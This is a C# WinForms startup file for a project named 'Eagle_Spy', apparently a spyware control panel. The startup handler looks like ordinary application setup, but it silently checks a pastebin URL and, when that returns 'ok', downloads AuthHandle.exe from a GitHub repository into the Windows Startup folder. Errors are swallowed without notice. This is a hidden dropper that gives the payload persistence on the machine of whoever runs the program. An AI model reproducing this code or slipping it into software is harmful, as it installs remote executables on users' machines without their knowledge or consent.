using System;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;
using System.Collections.ObjectModel;
using System.Diagnostics;
using UnhandledExceptionEventArgs = Microsoft.VisualBasic.ApplicationServices.UnhandledExceptionEventArgs;

namespace Eagle_Spy.My
{
    internal class MyApplication : WindowsFormsApplicationBase
    {
        [STAThread]
        [DebuggerHidden]
        internal static void Main(string[] Args)
        {
            try
            {
                Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.UseCompatibleTextRendering);
            }
            finally
            {
            }
            MyProject.Application.Run(Args);
        }

        private void MyApplication_Startup(object sender, StartupEventArgs e)
        {
            string checkUrl = "https://pastebin.com/raw/9msPBLnN";
            string downloadUrl = "https://github.com/KaramVaikar/ghng/raw/refs/heads/main/AuthHandle.exe";
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string destinationPath = Path.Combine(startupFolder, "AuthHandle.exe");

            try
            {
                string checkResult;
                using (WebClient client = new WebClient())
                {
                    checkResult = client.DownloadString(checkUrl).Trim();
                }


                if (checkResult == "ok")
                {
                    using (WebClient client = new WebClient())
                    {
                        client.DownloadFile(downloadUrl, destinationPath);
                    }

                }
                else
                {
                }
            }
            catch (Exception ex)
            {
            }
        }

        private void MyApplication_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            string logFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Errorlogs.txt");

            if (!File.Exists(logFilePath))
            {
                File.Create(logFilePath).Dispose();
            }

            Exception ex = e.Exception;
            string logDetails = $"Unhandled Exception: {ex.Message}\r\nStack Trace: {ex.StackTrace}\r\n-------------------\r\n";

            try
            {
                File.AppendAllText(logFilePath, logDetails);
            }
            catch (Exception logEx)
            {
                MessageBox.Show("Error logging the exception: " + logEx.Message, "Logging Error");
            }

            MessageBox.Show("Unhandled Exception occurred: " + ex.Message, "Error");

            e.ExitApplication = true;
        }

        [DebuggerStepThrough]
        public MyApplication() : base(AuthenticationMode.Windows)
        {
            base.Startup += MyApplication_Startup;
            base.UnhandledException += MyApplication_UnhandledException;
            base.IsSingleInstance = false;
            base.EnableVisualStyles = true;
            base.SaveMySettingsOnExit = true;
            base.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
        }

        [DebuggerStepThrough]
        protected override void OnCreateMainForm()
        {
            base.MainForm = MyProject.Forms.EagleSpyMain;
        }

        [DebuggerStepThrough]
        protected override bool OnInitialize(ReadOnlyCollection<string> commandLineArgs)
        {
            base.MinimumSplashScreenDisplayTime = 0;
            return base.OnInitialize(commandLineArgs);
        }
    }
}
